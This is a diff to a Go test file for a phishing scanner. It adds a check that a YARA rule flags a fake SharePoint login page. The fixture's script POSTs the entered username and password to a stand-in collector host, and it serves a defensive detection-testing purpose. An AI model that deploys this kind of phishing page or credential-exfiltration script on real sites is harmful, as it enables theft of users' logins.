@@ -24,6 +24,16 @@ func TestPhishingSharepoint_JavaScriptSubmission(t *testing.T) {
 	if !hasYaraRule(s.ScanBytes(extensionless), "phishing_sharepoint") {
 		t.Error("phishing_sharepoint gap: extensionless JavaScript collector not detected")
 	}
+	// Kits that build the body by hand carry no FormData and no serialize call.
+	// What convicts them is the destination: a collector script off-site.
+	manualBody := []byte(`<html><head><title>SharePoint - secured by Microsoft</title></head>
+<body><form id="l"><input type="password" name="p"></form>
+<script>fetch('https://collector.example.test/log.php', {method: 'POST', body: 'u=' + u.value + '&p=' + p.value});</script>
+</body></html>`)
+	if !hasYaraRule(s.ScanBytes(manualBody), "phishing_sharepoint") {
+		t.Error("phishing_sharepoint gap: kit posting a hand-built body to a collector script not detected")
+	}
+
 	legit := []byte(`<div class="wrap"><h1>OneDrive backup</h1>
 <p>Connect this site to OneDrive and Microsoft 365.</p>
 <form method="post"><input type="password" name="onedrive_app_secret" autocomplete="off"></form>
